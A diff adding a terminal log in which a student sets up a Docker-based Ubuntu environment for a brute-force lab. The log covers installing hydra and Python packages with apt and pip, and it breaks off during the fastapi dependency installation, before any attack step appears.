@@ -1,0 +1,544 @@
+aselbbaiyshbekova@Noutbuk-Asel Lab 12. Brute-force attacks % docker start -ai lab5-ubuntu
+root@c64f813bd218:/# mkdir -p /home/lab12
+root@c64f813bd218:/# cd /home/lab12
+root@c64f813bd218:/home/lab12# apt update
+Hit:1 http://ports.ubuntu.com/ubuntu-ports noble InRelease
+Hit:2 http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease
+Hit:3 http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease
+Hit:4 http://ports.ubuntu.com/ubuntu-ports noble-security InRelease
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+All packages are up to date.
+root@c64f813bd218:/home/lab12# apt install -y python3 python3-venv hydra
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+python3 is already the newest version (3.12.3-0ubuntu2.1).
+The following additional packages will be installed:
+  firebird3.0-common firebird3.0-common-doc fontconfig-config
+  fonts-dejavu-core fonts-dejavu-mono libapr1t64 libaprutil1t64
+  libbson-1.0-0t64 libcairo2 libfbclient2 libfontconfig1 libfreerdp2-2t64
+  libfreetype6 libhashkit2t64 libidn12 libjpeg-turbo8 libjpeg8
+  libmemcached11t64 libmongoc-1.0-0t64 libmongocrypt0 libmysqlclient21
+  libpixman-1-0 libpng16-16t64 libpq5 libserf-1-1 libsnappy1v5 libsvn1
+  libtommath1 libutf8proc3 libwinpr2-2t64 libxcb-render0 libxcb-shm0
+  libxkbfile1 libxrender1 mysql-common python3-pip-whl python3-setuptools-whl
+  python3.12-venv
+Suggested packages:
+  hydra-gtk freerdp2-x11
+The following NEW packages will be installed:
+  firebird3.0-common firebird3.0-common-doc fontconfig-config
+  fonts-dejavu-core fonts-dejavu-mono hydra libapr1t64 libaprutil1t64
+  libbson-1.0-0t64 libcairo2 libfbclient2 libfontconfig1 libfreerdp2-2t64
+  libfreetype6 libhashkit2t64 libidn12 libjpeg-turbo8 libjpeg8
+  libmemcached11t64 libmongoc-1.0-0t64 libmongocrypt0 libmysqlclient21
+  libpixman-1-0 libpng16-16t64 libpq5 libserf-1-1 libsnappy1v5 libsvn1
+  libtommath1 libutf8proc3 libwinpr2-2t64 libxcb-render0 libxcb-shm0
+  libxkbfile1 libxrender1 mysql-common python3-pip-whl python3-setuptools-whl
+  python3-venv python3.12-venv
+0 upgraded, 40 newly installed, 0 to remove and 0 not upgraded.
+Need to get 12.4 MB of archives.
+After this operation, 36.4 MB of additional disk space will be used.
+Get:1 http://ports.ubuntu.com/ubuntu-ports noble-updates/main arm64 libpng16-16t64 arm64 1.6.43-5ubuntu0.7 [187 kB]
+Get:2 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 firebird3.0-common-doc all 3.0.11.33703.ds4-2ubuntu2 [28.5 kB]
+Get:3 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 firebird3.0-common all 3.0.11.33703.ds4-2ubuntu2 [15.5 kB]
+Get:4 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 fonts-dejavu-mono all 2.37-8 [502 kB]
+Get:5 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 fonts-dejavu-core all 2.37-8 [835 kB]
+Get:6 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 fontconfig-config arm64 2.15.0-1.1ubuntu2 [37.4 kB]
+Get:7 http://ports.ubuntu.com/ubuntu-ports noble-updates/main arm64 libapr1t64 arm64 1.7.2-3.1ubuntu0.1 [106 kB]
+Get:8 http://ports.ubuntu.com/ubuntu-ports noble-updates/main arm64 libaprutil1t64 arm64 1.6.3-1.1ubuntu7.1 [94.7 kB]
+Get:9 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 libbson-1.0-0t64 arm64 1.26.0-1.1ubuntu2 [83.1 kB]
+Get:10 http://ports.ubuntu.com/ubuntu-ports noble-updates/main arm64 libfreetype6 arm64 2.13.2+dfsg-1ubuntu0.2 [393 kB]
+Get:11 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libfontconfig1 arm64 2.15.0-1.1ubuntu2 [142 kB]
+Get:12 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libpixman-1-0 arm64 0.42.2-1build1 [204 kB]
+Get:13 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libxcb-render0 arm64 1.15-1ubuntu2 [16.6 kB]
+Get:14 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libxcb-shm0 arm64 1.15-1ubuntu2 [5876 B]
+Get:15 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libxrender1 arm64 1:0.9.10-1.1build1 [18.8 kB]
+Get:16 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libcairo2 arm64 1.18.0-3build1 [555 kB]
+Get:17 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libtommath1 arm64 1.2.1-2build1 [58.8 kB]
+Get:18 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 libfbclient2 arm64 3.0.11.33703.ds4-2ubuntu2 [617 kB]
+Get:19 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libjpeg-turbo8 arm64 2.1.5-2ubuntu2 [163 kB]
+Get:20 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libjpeg8 arm64 8c-2ubuntu11 [2148 B]
+Get:21 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 libwinpr2-2t64 arm64 2.11.5+dfsg1-1build2 [353 kB]
+Get:22 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libxkbfile1 arm64 1:1.1.0-1build4 [69.4 kB]
+Get:23 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 libfreerdp2-2t64 arm64 2.11.5+dfsg1-1build2 [525 kB]
+Get:24 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libhashkit2t64 arm64 1.1.4-1.1build3 [15.6 kB]
+Get:25 http://ports.ubuntu.com/ubuntu-ports noble-updates/main arm64 libidn12 arm64 1.42-1ubuntu0.1 [57.1 kB]
+Get:26 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libmemcached11t64 arm64 1.1.4-1.1build3 [81.8 kB]
+Get:27 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 libmongocrypt0 arm64 1.8.4-1build3 [1307 kB]
+Get:28 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 libsnappy1v5 arm64 1.1.10-1build1 [28.6 kB]
+Get:29 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 libutf8proc3 arm64 2.9.0-1build1 [71.1 kB]
+Get:30 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 libmongoc-1.0-0t64 arm64 1.26.0-1.1ubuntu2 [356 kB]
+Get:31 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 mysql-common all 5.8+1.1.0build1 [6746 B]
+Get:32 http://ports.ubuntu.com/ubuntu-ports noble-updates/main arm64 libmysqlclient21 arm64 8.0.46-0ubuntu0.24.04.4 [1246 kB]
+Get:33 http://ports.ubuntu.com/ubuntu-ports noble-updates/main arm64 libpq5 arm64 16.15-0ubuntu0.24.04.1 [149 kB]
+Get:34 http://ports.ubuntu.com/ubuntu-ports noble-updates/universe arm64 libserf-1-1 arm64 1.3.10-1ubuntu0.24.04.1 [48.7 kB]
+Get:35 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 libsvn1 arm64 1.14.3-1build4 [1339 kB]
+Get:36 http://ports.ubuntu.com/ubuntu-ports noble-updates/universe arm64 python3-pip-whl all 24.0+dfsg-1ubuntu1.3 [1707 kB]
+Get:37 http://ports.ubuntu.com/ubuntu-ports noble-updates/universe arm64 python3-setuptools-whl all 68.1.2-2ubuntu1.2 [716 kB]
+Get:38 http://ports.ubuntu.com/ubuntu-ports noble-updates/universe arm64 python3.12-venv arm64 3.12.3-1ubuntu0.17 [5684 B]
+Get:39 http://ports.ubuntu.com/ubuntu-ports noble-updates/universe arm64 python3-venv arm64 3.12.3-0ubuntu2.1 [1032 B]
+Get:40 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 hydra arm64 9.5-1build3 [257 kB]
+Fetched 12.4 MB in 17s (733 kB/s)                                              
+debconf: delaying package configuration, since apt-utils is not installed
+Selecting previously unselected package libpng16-16t64:arm64.
+(Reading database ... 11673 files and directories currently installed.)
+Preparing to unpack .../00-libpng16-16t64_1.6.43-5ubuntu0.7_arm64.deb ...
+Unpacking libpng16-16t64:arm64 (1.6.43-5ubuntu0.7) ...
+Selecting previously unselected package firebird3.0-common-doc.
+Preparing to unpack .../01-firebird3.0-common-doc_3.0.11.33703.ds4-2ubuntu2_all.deb ...
+Unpacking firebird3.0-common-doc (3.0.11.33703.ds4-2ubuntu2) ...
+Selecting previously unselected package firebird3.0-common.
+Preparing to unpack .../02-firebird3.0-common_3.0.11.33703.ds4-2ubuntu2_all.deb ...
+Unpacking firebird3.0-common (3.0.11.33703.ds4-2ubuntu2) ...
+Selecting previously unselected package fonts-dejavu-mono.
+Preparing to unpack .../03-fonts-dejavu-mono_2.37-8_all.deb ...
+Unpacking fonts-dejavu-mono (2.37-8) ...
+Selecting previously unselected package fonts-dejavu-core.
+Preparing to unpack .../04-fonts-dejavu-core_2.37-8_all.deb ...
+Unpacking fonts-dejavu-core (2.37-8) ...
+Selecting previously unselected package fontconfig-config.
+Preparing to unpack .../05-fontconfig-config_2.15.0-1.1ubuntu2_arm64.deb ...
+Unpacking fontconfig-config (2.15.0-1.1ubuntu2) ...
+Selecting previously unselected package libapr1t64:arm64.
+Preparing to unpack .../06-libapr1t64_1.7.2-3.1ubuntu0.1_arm64.deb ...
+Unpacking libapr1t64:arm64 (1.7.2-3.1ubuntu0.1) ...
+Selecting previously unselected package libaprutil1t64:arm64.
+Preparing to unpack .../07-libaprutil1t64_1.6.3-1.1ubuntu7.1_arm64.deb ...
+Unpacking libaprutil1t64:arm64 (1.6.3-1.1ubuntu7.1) ...
+Selecting previously unselected package libbson-1.0-0t64.
+Preparing to unpack .../08-libbson-1.0-0t64_1.26.0-1.1ubuntu2_arm64.deb ...
+Unpacking libbson-1.0-0t64 (1.26.0-1.1ubuntu2) ...
+Selecting previously unselected package libfreetype6:arm64.
+Preparing to unpack .../09-libfreetype6_2.13.2+dfsg-1ubuntu0.2_arm64.deb ...
+Unpacking libfreetype6:arm64 (2.13.2+dfsg-1ubuntu0.2) ...
+Selecting previously unselected package libfontconfig1:arm64.
+Preparing to unpack .../10-libfontconfig1_2.15.0-1.1ubuntu2_arm64.deb ...
+Unpacking libfontconfig1:arm64 (2.15.0-1.1ubuntu2) ...
+Selecting previously unselected package libpixman-1-0:arm64.
+Preparing to unpack .../11-libpixman-1-0_0.42.2-1build1_arm64.deb ...
+Unpacking libpixman-1-0:arm64 (0.42.2-1build1) ...
+Selecting previously unselected package libxcb-render0:arm64.
+Preparing to unpack .../12-libxcb-render0_1.15-1ubuntu2_arm64.deb ...
+Unpacking libxcb-render0:arm64 (1.15-1ubuntu2) ...
+Selecting previously unselected package libxcb-shm0:arm64.
+Preparing to unpack .../13-libxcb-shm0_1.15-1ubuntu2_arm64.deb ...
+Unpacking libxcb-shm0:arm64 (1.15-1ubuntu2) ...
+Selecting previously unselected package libxrender1:arm64.
+Preparing to unpack .../14-libxrender1_1%3a0.9.10-1.1build1_arm64.deb ...
+Unpacking libxrender1:arm64 (1:0.9.10-1.1build1) ...
+Selecting previously unselected package libcairo2:arm64.
+Preparing to unpack .../15-libcairo2_1.18.0-3build1_arm64.deb ...
+Unpacking libcairo2:arm64 (1.18.0-3build1) ...
+Selecting previously unselected package libtommath1:arm64.
+Preparing to unpack .../16-libtommath1_1.2.1-2build1_arm64.deb ...
+Unpacking libtommath1:arm64 (1.2.1-2build1) ...
+Selecting previously unselected package libfbclient2:arm64.
+Preparing to unpack .../17-libfbclient2_3.0.11.33703.ds4-2ubuntu2_arm64.deb ...
+Unpacking libfbclient2:arm64 (3.0.11.33703.ds4-2ubuntu2) ...
+Selecting previously unselected package libjpeg-turbo8:arm64.
+Preparing to unpack .../18-libjpeg-turbo8_2.1.5-2ubuntu2_arm64.deb ...
+Unpacking libjpeg-turbo8:arm64 (2.1.5-2ubuntu2) ...
+Selecting previously unselected package libjpeg8:arm64.
+Preparing to unpack .../19-libjpeg8_8c-2ubuntu11_arm64.deb ...
+Unpacking libjpeg8:arm64 (8c-2ubuntu11) ...
+Selecting previously unselected package libwinpr2-2t64:arm64.
+Preparing to unpack .../20-libwinpr2-2t64_2.11.5+dfsg1-1build2_arm64.deb ...
+Unpacking libwinpr2-2t64:arm64 (2.11.5+dfsg1-1build2) ...
+Selecting previously unselected package libxkbfile1:arm64.
+Preparing to unpack .../21-libxkbfile1_1%3a1.1.0-1build4_arm64.deb ...
+Unpacking libxkbfile1:arm64 (1:1.1.0-1build4) ...
+Selecting previously unselected package libfreerdp2-2t64:arm64.
+Preparing to unpack .../22-libfreerdp2-2t64_2.11.5+dfsg1-1build2_arm64.deb ...
+Unpacking libfreerdp2-2t64:arm64 (2.11.5+dfsg1-1build2) ...
+Selecting previously unselected package libhashkit2t64:arm64.
+Preparing to unpack .../23-libhashkit2t64_1.1.4-1.1build3_arm64.deb ...
+Unpacking libhashkit2t64:arm64 (1.1.4-1.1build3) ...
+Selecting previously unselected package libidn12:arm64.
+Preparing to unpack .../24-libidn12_1.42-1ubuntu0.1_arm64.deb ...
+Unpacking libidn12:arm64 (1.42-1ubuntu0.1) ...
+Selecting previously unselected package libmemcached11t64:arm64.
+Preparing to unpack .../25-libmemcached11t64_1.1.4-1.1build3_arm64.deb ...
+Unpacking libmemcached11t64:arm64 (1.1.4-1.1build3) ...
+Selecting previously unselected package libmongocrypt0:arm64.
+Preparing to unpack .../26-libmongocrypt0_1.8.4-1build3_arm64.deb ...
+Unpacking libmongocrypt0:arm64 (1.8.4-1build3) ...
+Selecting previously unselected package libsnappy1v5:arm64.
+Preparing to unpack .../27-libsnappy1v5_1.1.10-1build1_arm64.deb ...
+Unpacking libsnappy1v5:arm64 (1.1.10-1build1) ...
+Selecting previously unselected package libutf8proc3:arm64.
+Preparing to unpack .../28-libutf8proc3_2.9.0-1build1_arm64.deb ...
+Unpacking libutf8proc3:arm64 (2.9.0-1build1) ...
+Selecting previously unselected package libmongoc-1.0-0t64.
+Preparing to unpack .../29-libmongoc-1.0-0t64_1.26.0-1.1ubuntu2_arm64.deb ...
+Unpacking libmongoc-1.0-0t64 (1.26.0-1.1ubuntu2) ...
+Selecting previously unselected package mysql-common.
+Preparing to unpack .../30-mysql-common_5.8+1.1.0build1_all.deb ...
+Unpacking mysql-common (5.8+1.1.0build1) ...
+Selecting previously unselected package libmysqlclient21:arm64.
+Preparing to unpack .../31-libmysqlclient21_8.0.46-0ubuntu0.24.04.4_arm64.deb ...
+Unpacking libmysqlclient21:arm64 (8.0.46-0ubuntu0.24.04.4) ...
+Selecting previously unselected package libpq5:arm64.
+Preparing to unpack .../32-libpq5_16.15-0ubuntu0.24.04.1_arm64.deb ...
+Unpacking libpq5:arm64 (16.15-0ubuntu0.24.04.1) ...
+Selecting previously unselected package libserf-1-1:arm64.
+Preparing to unpack .../33-libserf-1-1_1.3.10-1ubuntu0.24.04.1_arm64.deb ...
+Unpacking libserf-1-1:arm64 (1.3.10-1ubuntu0.24.04.1) ...
+Selecting previously unselected package libsvn1:arm64.
+Preparing to unpack .../34-libsvn1_1.14.3-1build4_arm64.deb ...
+Unpacking libsvn1:arm64 (1.14.3-1build4) ...
+Selecting previously unselected package python3-pip-whl.
+Preparing to unpack .../35-python3-pip-whl_24.0+dfsg-1ubuntu1.3_all.deb ...
+Unpacking python3-pip-whl (24.0+dfsg-1ubuntu1.3) ...
+Selecting previously unselected package python3-setuptools-whl.
+Preparing to unpack .../36-python3-setuptools-whl_68.1.2-2ubuntu1.2_all.deb ...
+Unpacking python3-setuptools-whl (68.1.2-2ubuntu1.2) ...
+Selecting previously unselected package python3.12-venv.
+Preparing to unpack .../37-python3.12-venv_3.12.3-1ubuntu0.17_arm64.deb ...
+Unpacking python3.12-venv (3.12.3-1ubuntu0.17) ...
+Selecting previously unselected package python3-venv.
+Preparing to unpack .../38-python3-venv_3.12.3-0ubuntu2.1_arm64.deb ...
+Unpacking python3-venv (3.12.3-0ubuntu2.1) ...
+Selecting previously unselected package hydra.
+Preparing to unpack .../39-hydra_9.5-1build3_arm64.deb ...
+Unpacking hydra (9.5-1build3) ...
+Setting up libpixman-1-0:arm64 (0.42.2-1build1) ...
+Setting up mysql-common (5.8+1.1.0build1) ...
+update-alternatives: using /etc/mysql/my.cnf.fallback to provide /etc/mysql/my.cnf (my.cnf) in auto mode
+Setting up libmysqlclient21:arm64 (8.0.46-0ubuntu0.24.04.4) ...
+Setting up python3-setuptools-whl (68.1.2-2ubuntu1.2) ...
+Setting up libxrender1:arm64 (1:0.9.10-1.1build1) ...
+Setting up libutf8proc3:arm64 (2.9.0-1build1) ...
+Setting up python3-pip-whl (24.0+dfsg-1ubuntu1.3) ...
+Setting up libxcb-render0:arm64 (1.15-1ubuntu2) ...
+Setting up libtommath1:arm64 (1.2.1-2build1) ...
+Setting up libwinpr2-2t64:arm64 (2.11.5+dfsg1-1build2) ...
+Setting up libpq5:arm64 (16.15-0ubuntu0.24.04.1) ...
+Setting up libxcb-shm0:arm64 (1.15-1ubuntu2) ...
+Setting up firebird3.0-common-doc (3.0.11.33703.ds4-2ubuntu2) ...
+Setting up libsnappy1v5:arm64 (1.1.10-1build1) ...
+Setting up firebird3.0-common (3.0.11.33703.ds4-2ubuntu2) ...
+Setting up fonts-dejavu-mono (2.37-8) ...
+Setting up libpng16-16t64:arm64 (1.6.43-5ubuntu0.7) ...
+Setting up libidn12:arm64 (1.42-1ubuntu0.1) ...
+Setting up fonts-dejavu-core (2.37-8) ...
+Setting up libjpeg-turbo8:arm64 (2.1.5-2ubuntu2) ...
+Setting up libapr1t64:arm64 (1.7.2-3.1ubuntu0.1) ...
+Setting up libhashkit2t64:arm64 (1.1.4-1.1build3) ...
+Setting up libxkbfile1:arm64 (1:1.1.0-1build4) ...
+Setting up libbson-1.0-0t64 (1.26.0-1.1ubuntu2) ...
+Setting up libmongocrypt0:arm64 (1.8.4-1build3) ...
+Setting up libjpeg8:arm64 (8c-2ubuntu11) ...
+Setting up libaprutil1t64:arm64 (1.6.3-1.1ubuntu7.1) ...
+Setting up python3.12-venv (3.12.3-1ubuntu0.17) ...
+Setting up fontconfig-config (2.15.0-1.1ubuntu2) ...
+Setting up libserf-1-1:arm64 (1.3.10-1ubuntu0.24.04.1) ...
+Setting up libmemcached11t64:arm64 (1.1.4-1.1build3) ...
+Setting up libfbclient2:arm64 (3.0.11.33703.ds4-2ubuntu2) ...
+Setting up python3-venv (3.12.3-0ubuntu2.1) ...
+Setting up libfreetype6:arm64 (2.13.2+dfsg-1ubuntu0.2) ...
+Setting up libmongoc-1.0-0t64 (1.26.0-1.1ubuntu2) ...
+Setting up libfontconfig1:arm64 (2.15.0-1.1ubuntu2) ...
+Setting up libsvn1:arm64 (1.14.3-1build4) ...
+Setting up libcairo2:arm64 (1.18.0-3build1) ...
+Setting up libfreerdp2-2t64:arm64 (2.11.5+dfsg1-1build2) ...
+Setting up hydra (9.5-1build3) ...
+Processing triggers for libc-bin (2.39-0ubuntu8.9) ...
+root@c64f813bd218:/home/lab12# python3 -m venv venv
+root@c64f813bd218:/home/lab12# source venv/bin/activate
+(venv) root@c64f813bd218:/home/lab12# pip install "fastapi[standard]"
+Collecting fastapi[standard]
+  Downloading fastapi-0.143.0-py3-none-any.whl.metadata (26 kB)
+Collecting starlette>=0.46.0 (from fastapi[standard])
+  Downloading starlette-1.7.0-py3-none-any.whl.metadata (6.6 kB)
+Collecting pydantic>=2.9.0 (from fastapi[standard])
+  Downloading pydantic-2.14.1-py3-none-any.whl.metadata (133 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 133.0/133.0 kB 523.7 kB/s eta 0:00:00
+Collecting typing-extensions>=4.8.0 (from fastapi[standard])
+  Downloading typing_extensions-4.16.0-py3-none-any.whl.metadata (3.3 kB)
+Collecting typing-inspection>=0.4.2 (from fastapi[standard])
+  Downloading typing_inspection-0.4.4-py3-none-any.whl.metadata (2.6 kB)
+Collecting annotated-doc>=0.0.2 (from fastapi[standard])
+  Downloading annotated_doc-0.0.5-py3-none-any.whl.metadata (6.5 kB)
+Collecting opentelemetry-api>=1.44.0 (from fastapi[standard])
+  Downloading opentelemetry_api-1.45.1-py3-none-any.whl.metadata (1.4 kB)
+Collecting opentelemetry-sdk>=1.44.0 (from fastapi[standard])
+  Downloading opentelemetry_sdk-1.45.1-py3-none-any.whl.metadata (1.6 kB)
+Collecting opentelemetry-exporter-otlp-proto-http>=1.44.0 (from fastapi[standard])
+  Downloading opentelemetry_exporter_otlp_proto_http-1.45.1-py3-none-any.whl.metadata (3.0 kB)
+Collecting fastapi-cli>=0.0.32 (from fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading fastapi_cli-0.0.32-py3-none-any.whl.metadata (6.7 kB)
+Collecting fastar>=0.9.0 (from fastapi[standard])
+  Downloading fastar-0.12.0-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl.metadata (4.1 kB)
+Collecting httpx<1.0.0,>=0.23.0 (from fastapi[standard])
+  Downloading httpx-0.28.1-py3-none-any.whl.metadata (7.1 kB)
+Collecting jinja2>=3.1.5 (from fastapi[standard])
+  Downloading jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
+Collecting python-multipart>=0.0.18 (from fastapi[standard])
+  Downloading python_multipart-0.0.32-py3-none-any.whl.metadata (2.1 kB)
+Collecting email-validator>=2.0.0 (from fastapi[standard])
+  Downloading email_validator-2.3.0-py3-none-any.whl.metadata (26 kB)
+Collecting uvicorn>=0.12.0 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
+  Downloading uvicorn-0.54.0-py3-none-any.whl.metadata (6.6 kB)
+Collecting pydantic-settings>=2.0.0 (from fastapi[standard])
+  Downloading pydantic_settings-2.15.0-py3-none-any.whl.metadata (3.9 kB)
+Collecting pydantic-extra-types>=2.0.0 (from fastapi[standard])
+  Downloading pydantic_extra_types-2.11.1-py3-none-any.whl.metadata (4.2 kB)
+Collecting dnspython>=2.0.0 (from email-validator>=2.0.0->fastapi[standard])
+  Downloading dnspython-2.9.0-py3-none-any.whl.metadata (5.7 kB)
+Collecting idna>=2.0.0 (from email-validator>=2.0.0->fastapi[standard])
+  Downloading idna-3.20-py3-none-any.whl.metadata (7.2 kB)
+Collecting typer>=0.16.0 (from fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading typer-0.27.3-py3-none-any.whl.metadata (16 kB)
+Collecting rich-toolkit>=0.14.8 (from fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading rich_toolkit-0.20.6-py3-none-any.whl.metadata (3.0 kB)
+Collecting fastapi-cloud-cli>=0.1.1 (from fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading fastapi_cloud_cli-0.26.0-py3-none-any.whl.metadata (3.1 kB)
+Collecting anyio (from httpx<1.0.0,>=0.23.0->fastapi[standard])
+  Downloading anyio-4.15.1-py3-none-any.whl.metadata (4.7 kB)
+Collecting certifi (from httpx<1.0.0,>=0.23.0->fastapi[standard])
+  Downloading certifi-2026.7.22-py3-none-any.whl.metadata (2.5 kB)
+Collecting httpcore==1.* (from httpx<1.0.0,>=0.23.0->fastapi[standard])
+  Downloading httpcore-1.0.9-py3-none-any.whl.metadata (21 kB)
+Collecting h11>=0.16 (from httpcore==1.*->httpx<1.0.0,>=0.23.0->fastapi[standard])
+  Downloading h11-0.16.0-py3-none-any.whl.metadata (8.3 kB)
+Collecting MarkupSafe>=2.0 (from jinja2>=3.1.5->fastapi[standard])
+  Downloading markupsafe-3.0.4-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl.metadata (2.7 kB)
+Collecting googleapis-common-protos~=1.52 (from opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
+  Downloading googleapis_common_protos-1.75.5-py3-none-any.whl.metadata (8.5 kB)
+Collecting opentelemetry-exporter-http-transport==0.66b1 (from opentelemetry-exporter-http-transport[requests]==0.66b1->opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
+  Downloading opentelemetry_exporter_http_transport-0.66b1-py3-none-any.whl.metadata (2.3 kB)
+Collecting opentelemetry-exporter-otlp-common==0.66b1 (from opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
+  Downloading opentelemetry_exporter_otlp_common-0.66b1-py3-none-any.whl.metadata (1.9 kB)
+Collecting opentelemetry-exporter-otlp-proto-common==1.45.1 (from opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
+  Downloading opentelemetry_exporter_otlp_proto_common-1.45.1-py3-none-any.whl.metadata (1.8 kB)
+Collecting opentelemetry-proto==1.45.1 (from opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
+  Downloading opentelemetry_proto-1.45.1-py3-none-any.whl.metadata (2.3 kB)
+Collecting requests~=2.7 (from opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
+  Downloading requests-2.34.2-py3-none-any.whl.metadata (4.8 kB)
+Collecting protobuf<8.0,>=5.0 (from opentelemetry-proto==1.45.1->opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
+  Downloading protobuf-7.36.2-cp310-abi3-manylinux2014_aarch64.whl.metadata (595 bytes)
+Collecting opentelemetry-semantic-conventions==0.66b1 (from opentelemetry-sdk>=1.44.0->fastapi[standard])
+  Downloading opentelemetry_semantic_conventions-0.66b1-py3-none-any.whl.metadata (2.4 kB)
+Collecting annotated-types>=0.6.0 (from pydantic>=2.9.0->fastapi[standard])
+  Downloading annotated_types-0.8.0-py3-none-any.whl.metadata (15 kB)
+Collecting pydantic-core==2.50.1 (from pydantic>=2.9.0->fastapi[standard])
+  Downloading pydantic_core-2.50.1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl.metadata (6.5 kB)
+Collecting python-dotenv>=0.21.0 (from pydantic-settings>=2.0.0->fastapi[standard])
+  Downloading python_dotenv-1.2.4-py3-none-any.whl.metadata (29 kB)
+Collecting click>=7.0 (from uvicorn>=0.12.0->uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
+  Downloading click-8.5.0-py3-none-any.whl.metadata (2.6 kB)
+Collecting httptools>=0.8.0 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
+  Downloading httptools-0.9.0-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl.metadata (3.5 kB)
+Collecting pyyaml>=5.1 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
+  Downloading pyyaml-6.0.3-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl.metadata (2.4 kB)
+Collecting uvloop>=0.15.1 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
+  Downloading uvloop-0.23.0-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl.metadata (5.1 kB)
+Collecting watchfiles>=0.20 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
+  Downloading watchfiles-1.3.0-cp310-abi3-manylinux_2_17_aarch64.manylinux2014_aarch64.whl.metadata (4.9 kB)
+Collecting websockets>=13.0 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
+  Downloading websockets-17.2-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl.metadata (6.3 kB)
+Collecting rignore>=0.5.1 (from fastapi-cloud-cli>=0.1.1->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading rignore-0.8.1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl.metadata (4.2 kB)
+Collecting sentry-sdk>=2.20.0 (from fastapi-cloud-cli>=0.1.1->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading sentry_sdk-2.72.0-py3-none-any.whl.metadata (11 kB)
+Collecting detect-installer>=0.1.0 (from fastapi-cloud-cli>=0.1.1->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading detect_installer-0.2.1-py3-none-any.whl.metadata (1.2 kB)
+Collecting agent-detector>=1.1.0 (from fastapi-cloud-cli>=0.1.1->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading agent_detector-2.0.0-py3-none-any.whl.metadata (6.6 kB)
+Collecting charset_normalizer<4,>=2 (from requests~=2.7->opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
+  Downloading charset_normalizer-3.5.2-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl.metadata (46 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 46.4/46.4 kB 682.9 kB/s eta 0:00:00
+Collecting urllib3<3,>=1.26 (from requests~=2.7->opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
+  Downloading urllib3-2.8.0-py3-none-any.whl.metadata (7.4 kB)
+Collecting rich>=13.7.1 (from rich-toolkit>=0.14.8->fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading rich-15.0.0-py3-none-any.whl.metadata (18 kB)
